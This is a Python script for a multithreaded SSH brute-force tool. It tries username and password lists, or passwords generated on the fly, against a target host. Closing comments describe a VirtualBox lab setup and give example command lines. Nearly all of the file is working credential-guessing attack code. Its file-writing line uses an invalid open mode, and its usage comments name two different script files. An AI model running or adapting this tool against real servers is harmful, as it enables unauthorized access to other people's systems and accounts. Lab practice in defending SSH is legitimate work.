import paramiko
import socket
import time
from colorama import init, Fore
import itertools
import string
import argparse
import queue
import sys
import os
import contextlib
from threading import Thread

init()

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED

q = queue.Queue()

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull

        try:
            yield

        finally:
            sys.stderr = old_stderr

def is_ssh_open(hostname, username, password, retry_count=3, retry_delay=10):
    client = paramiko.SSHClient() # Initialize Client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Create Public Key

    try: 
        with suppress_stderr():
            client.connect(hostname=hostname, username=username, password=password, timeout=3)

    except socket.timeout:
        print(f'{RED}[!] Host: {hostname} is unreachable. Time out {RESET}')
        return False

    except paramiko.AuthenticationException:
        print(f'{RED}[-] Invalid credentials for {username}:{password}{RESET}')
        return False

    except paramiko.SSHException as e:
        if retry_count > 0:
            print(f'{BLUE} [*] SSH Exception: {str(e)} {RESET}')
            print(f'{BLUE}[*] Retrying in {retry_delay} seconds...{RESET}')
            time.sleep(retry_delay)
            return is_ssh_open(hostname, username, password, retry_count-1, retry_delay*2)
        
        else:
            print(f'{RED}[!] Maximum retries reached, Skipping {username}:{password}{RESET}')
            return False
        
    except Exception as e:
        print(f'{RED}[!] Unexpected Error: {str(e)}{RESET}')
        return False
    
    else:
        print(f'{GREEN} Found Combo: \n\t HOSTNAME:{hostname} \n\t USERNAME:{username} \n\t PASSWORD:{password}{RESET}')

        return True
    

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines


def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)


def worker(host):
    while not q.empty():
        username, password = q.get()

        if is_ssh_open(host, username, password):
            with open('credentials.txt', '') as f:
                f.write(f'{username}@{host}: {password}')

            break

        q.task_done()

def main():
    parser = argparse.ArgumentParser(description='Advanced SSH Bruteforce..')

    parser.add_argument('host', help='Hostname or IP Address of SSH server..')
    parser.add_argument('-P', '--passlist', help='Password list to brute force ssh..')
    parser.add_argument('-u', '--user', help='Single username to use..')
    parser.add_argument('-U', '--userlist', help='Usernames list to ssh brute force..')
    parser.add_argument('-g', '--generate', action='store_true',  help='Generate passwords on the fly..')
    parser.add_argument('--min_length', type=int, help='Minimum length to generate password..', default=1)
    parser.add_argument('--max_length', type=int, help='Maximum length to generate password..', default=4)
    parser.add_argument('-c', '--chars', type=str, help='Charactres to use for password generation..', default=string.ascii_lowercase + string.digits)
    parser.add_argument('--threads', type=int, help='Number of threads to use..', default=4)
    
    args = parser.parse_args()

    host = args.host
    threads = args.threads

    if not args.user and not args.userlist:
        print('Please provide a username or usernames file...')
        sys.exit(1)

    if args.userlist:
        users = load_lines(args.userlist)

    else:
        users = [args.user]


    if args.passlist:
        passwords = load_lines(args.passlist)

    elif args.generate:
        passwords = list(generate_passwords(args.min_length, args.max_length, args.chars))

    else:
        print('Please provide a password list or specify to generate passwords.')
        sys.exit(1)


    if args.passlist:
        print(f'[+] Username to try: {len(users)}')
        print(f'[+] Password to try: {len(passwords)}')
    else:
        print(f'[+] Username to try: {len(users)}')
        print(f'[+] Generate passwords on the fly.')


    for user in users:
        for password in passwords:
            q.put((user, password))

    
    for _ in range(threads):
        thread = Thread(target=worker, args=(host, ))
        thread.daemon = True
        thread.start()

    q.join()


if __name__ == '__main__':
    main()


# Steps to run this script:
# Create a text document 'usernames' and add it to your folder.

# Open linux window in VirtualBox 
# Open terminal and run following commands:
# sudo apt update
# sudo apt install openssh-server
# sudo systemctl start ssh
# sudo systemctl status ssh

# Open terminal in VScode and Run:
# cd .\SSH_Cracker_Tool\

# python ssh_bruteforce.py <host> [-P <password_list>] [-u <username>] [-U <userlist>] [-g] [--min_length <min_length>] [--max_length <max_length>] [-c <chars>] [--threads <number_of_threads>]

# python .\advanced_ssh.py <host IP> -g -c 1234567890 --min_length 4 --max_length 4 -U .\usernames.txt

